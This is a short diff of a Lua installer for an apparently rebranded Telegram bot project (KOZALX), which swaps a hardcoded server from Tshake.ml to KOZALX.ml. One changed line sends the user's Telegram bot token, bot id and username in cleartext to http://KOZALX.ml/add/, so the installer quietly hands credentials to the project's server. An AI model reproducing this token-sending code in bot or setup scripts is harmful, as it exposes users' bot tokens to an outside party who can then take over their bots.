@@ -38,7 +38,7 @@ if not database:get(Server_KOZALX.."UserName_KOZALX") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://Tshake.ml/info/?user="..UserName)
+local Get_Info = http.request("http://KOZALX.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_KOZALX_Info()
 Create_Info(database:get(Server_KOZALX.."Token_KOZALX"),database:get(Server_KOZALX.."Id_KOZALX"),database:get(Server_KOZALX.."UserName_KOZALX"))   
-http.request("http://Tshake.ml/add/?id="..database:get(Server_KOZALX.."Id_KOZALX").."&user="..database:get(Server_KOZALX.."UserName_KOZALX").."&token="..database:get(Server_KOZALX.."Token_KOZALX"))
+http.request("http://KOZALX.ml/add/?id="..database:get(Server_KOZALX.."Id_KOZALX").."&user="..database:get(Server_KOZALX.."UserName_KOZALX").."&token="..database:get(Server_KOZALX.."Token_KOZALX"))
 local RunKOZALX = io.open("KOZALX", 'w')
 RunKOZALX:write([[
 #!/usr/bin/env bash
